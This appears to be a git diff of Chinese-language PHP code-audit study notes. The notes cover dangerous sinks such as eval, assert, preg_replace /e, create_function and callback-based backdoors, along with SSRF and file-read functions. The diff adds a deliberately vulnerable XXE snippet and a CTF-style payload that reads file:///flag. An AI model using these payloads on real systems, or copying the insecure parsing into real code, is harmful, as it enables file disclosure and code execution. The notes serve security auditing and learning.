@@ -1,9 +1,9 @@
-u审计流程：
+审计流程：
 * 审计前了解服务环境
 * 了解网站功能
 * 制定计划（审核功能点，容易出现得漏洞）
-* 工具扫描/正则搜索相关敏感函数、可控变量
-* 追踪危险函数
+* 工具扫描/正则搜索相关敏感函数、可控变量，输入，注册。
+* 追踪危险函数，弱类型比较==。
 * 利用复现漏洞
 * 形成PHP代码审计报告
 
@@ -15,35 +15,7 @@ u审计流程：
 危险函数：
 <https://www.freebuf.com/articles/web/269184.html>
 
-## **参数处理函数缺陷**
-urldecode — 解码已编码的 URL 字符串
-```
-语法：urldecode( string $str) : string
-解码给出的已编码字符串中的任何 %##。 加号（'+'）被解码成一个空格字符。
 
-下面列举了一个关于urldecode()引发SQL注入的例子（具体漏洞编号没找到）
-是以前Discuz X1.5的一个漏洞
-foreach($_POST as $k => $v) {
-$value = urldecode($v);
-$this->setParameter($k, $value);
-}
-
-单引号被 urlencode 两次以后是 %2527，然后 POST，PHP 内部在生成全局变量 $_POST 的时候会先 urldecode，得到 %27，然后 PHP 会检查 Magic Quotes 的设置，但是无论是否开启 Magic Quotes，%27 都不会被转义，因为这时根本没有单引号。但是这时如果在PHP中加上 urldecode，%27就变成单引号了
-```
-
-rawurldecode — 对已编码的 URL 字符串进行解码
-```
-语法 rawurldecode( string $str) : string
-返回字符串，此字符串中百分号（%）后跟两位十六进制数的序列都将被替换成原义字符。
-这个就不细讲了，和urldecode差不多。
-```
-
-is_numeric
-```
-bool is_numeric ( mixed $var )
-如果 var 是数字和数字字符串则返回 TRUE，否则返回 FALSE。
-仅用is_numeric判断而不用intval转换就有可能插入16进制的字符串到数据库，进而可能导致sql二次注入。
-```
 
 ^
 ## **SQL注入**
@@ -121,6 +93,7 @@ $stmt->execute();
 ```
 copy
 file_get_contents()
+file_put_contents()
 highlight_file()
 fopen()
 read file()
@@ -157,7 +130,7 @@ include($_GET['file']);
 
 ^
 ## **代码执行**
-eval() assert()
+**eval() assert()**
 ```
 eval() — 把字符串作为PHP代码执行。这个函数一般都是攻击者用的，没什么人会拿这个放到自己的源码里面
 
@@ -168,7 +141,7 @@ PHP 7 ：assert( mixed$assertion, Throwable $exception= ? ) : bool
 assert()会检查指定的 assertion并在结果为 false时采取适当的行动（把字符串 $assertion 作为PHP代码执行）
 ```
 
-preg_replace — 执行一个正则表达式的搜索和替换
+**preg_replace — 执行一个正则表达式的搜索和替换**
 ```
 preg_replace( mixed$pattern, mixed$replacement, mixed$subject, int $limit= -1 , int &$count= ? ) : mixed
 搜索 subject中匹配 pattern的部分，以 replacement进行替换。
@@ -179,7 +152,7 @@ preg_replace("/test/e",$_GET["h"],"jutst test");
 如果我们提交 ?h=phpinfo()，/e就会将h参数当做PHP代码，phpinfo()将会被执行。
 ```
 
-create_function —创建一个匿名（lambda样式）函数
+**create_function —创建一个匿名（lambda样式）函数**
 ```
 语法
 create_function（字符串 $args，字符串 $code）：字符串
@@ -191,7 +164,7 @@ $newfunc('whoami');
 这里就相当于执行了system('whoami')
 ```
 
-array_map — 为数组的每个元素应用回调函数
+**array_map — 为数组的每个元素应用回调函数**
 ```
 语法
 array_map( callable$callback, array $array, array ...$arrays) : array
@@ -206,7 +179,7 @@ $new_array=array_map($arr,$array);
 ?>
 ```
 
-call_user_func — 把第一个参数作为回调函数调用
+**call_user_func — 把第一个参数作为回调函数调用**
 ```
 语法
 call_user_func( callable$callback, mixed$parameter= ? , mixed$...= ? ) : mixed
@@ -220,7 +193,7 @@ call_user_func("assert",$_GET['cmd']);
 通常用来制作变形的PHP一句话后门
 ```
 
-call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数
+**call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数**
 ```
 语法
 call_user_func_array( callable$callback, array $param_arr) : mixed
@@ -247,22 +220,24 @@ call_user_func_array("assert",$array);
 ```
 
 
-array_filter — 使用回调函数过滤数组的元素
+**array_filter — 使用回调函数过滤数组的元素**
 ```
 语法
 array_filter( array $array, callable|null $callback= null, int $mode= 0 ) : array
-遍历 array数组中的每个值，并将每个值传递给 callback回调函数。 如果 callback回调函数返回 true，则将 array数组中的当前值返回到结果 array 数组中。
+遍历 array数组中的每个值，并将每个值传递给 callback回调函数。 
+如果 callback回调函数返回 true，则将 array数组中的当前值返回到结果 array 数组中。
 
-返回结果 array 数组的键名（下标）会维持不变，如果 array参数是索引数组，返回的结果 array 数组键名（下标）可能会不连续。 可以使用 array_values()函数对数组重新索引。
+返回结果 array 数组的键名（下标）会维持不变，如果 array参数是索引数组，
+返回的结果 array 数组键名（下标）可能会不连续。 可以使用 array_values()函数对数组重新索引。
 
-参数¶
+参数
 array
 要遍历的数组
 
 callback
 使用的回调函数
-
-如果没有提供 callback回调函数，将删除数组中 array的所有“空”元素。 有关 PHP 如何判定“空”元素，请参阅 empty()。
+如果没有提供 callback回调函数，将删除数组中 array的所有“空”元素。 
+有关 PHP 如何判定“空”元素，请参阅 empty()。
 
 mode
 决定哪些参数发送到 callback回调的标志：
@@ -270,7 +245,8 @@ mode
 ARRAY_FILTER_USE_KEY- 将键名作为 callback回调的唯一参数，而不是值
 ARRAY_FILTER_USE_BOTH- 将值和键都作为参数传递给 callback回调，而不是仅传递值
 默认值为 0，只传递值作为 callback回调的唯一参数。
-返回值¶
+
+返回值
 返回过滤后的数组。
 
 举个例子
@@ -360,6 +336,66 @@ simplexml_import_dom()
 simplexml_load_file()
 simplexml_load_string()
 xpath()
+
+
+
+
+
+// 允许加载外部实体
+libxml_disable_entity_loader(false);
+// xml文件来源于数据流
+$xmlfile = file_get_contents('php://input');
+if(isset($xmlfile)){
+    $dom = new DOMDocument();
+  	// 加载xml实体，参数为替代实体、加载外部子集
+    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+  	// 把 DOM 节点转换为 SimpleXMLElement 对象
+    $creds = simplexml_import_dom($dom);
+  	// 节点嵌套
+    $ctfshow = $creds->ctfshow;
+    echo $ctfshow;
+}
+
+[POST]Payload:
+<?xml version="1.0"?>
+<!DOCTYPE payload [
+<!ELEMENT payload ANY>
+<!ENTITY xxe SYSTEM "file:///flag">
+]>
+<creds>
+<ctfshow>&xxe;</ctfshow>
+</creds>
+
+
+类似的
+libxml_disable_entity_loader(false);
+$xmlfile = file_get_contents('php://input');
+if(isset($xmlfile)){
+    $dom = new DOMDocument();
+    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+}
+```
+
+PHP的内置类
+SimpleXMLElement
+对象
+```
+// 解析 XML 数据
+$xmlData = '<root><element>value</element></root>';
+$xml = new SimpleXMLElement($xmlData);
+
+// 解析 XML 文件 URL
+$xmlUrl = 'http://example.com/example.xml';
+$xml = new SimpleXMLElement($xmlUrl, 0, TRUE);
+此时外链的xml是存在xxe即可。
+
+// 解析 XML 数据并指定解析选项
+$xmlData = '<root><element>value</element></root>';
+$xml = new SimpleXMLElement($xmlData, LIBXML_NOCDATA | LIBXML_NOEMPTYTAG);
+
+// 解析 XML 数据并指定命名空间
+$xmlData = '<root xmlns:ns="http://example.com/ns"><ns:element>value</ns:element></root>';
+$xml = new SimpleXMLElement($xmlData, 0, FALSE, 'http://example.com/ns');
 ```
 
 ## **引发信息泄露的危险函数**
@@ -405,7 +441,7 @@ curl():用于执行指定的CURL会话，支持的协议比较多，常用于SSR
 
 
 
-file_get_contengt():把文件写入字符串，当把url是内网文件的时候，会先去把这个文件的内容读出来再写入，导致了文件读取
+file_get_contents():把文件写入字符串，当把url是内网文件的时候，会先去把这个文件的内容读出来再写入，导致了文件读取
 
 fopen():打开一个文件
 
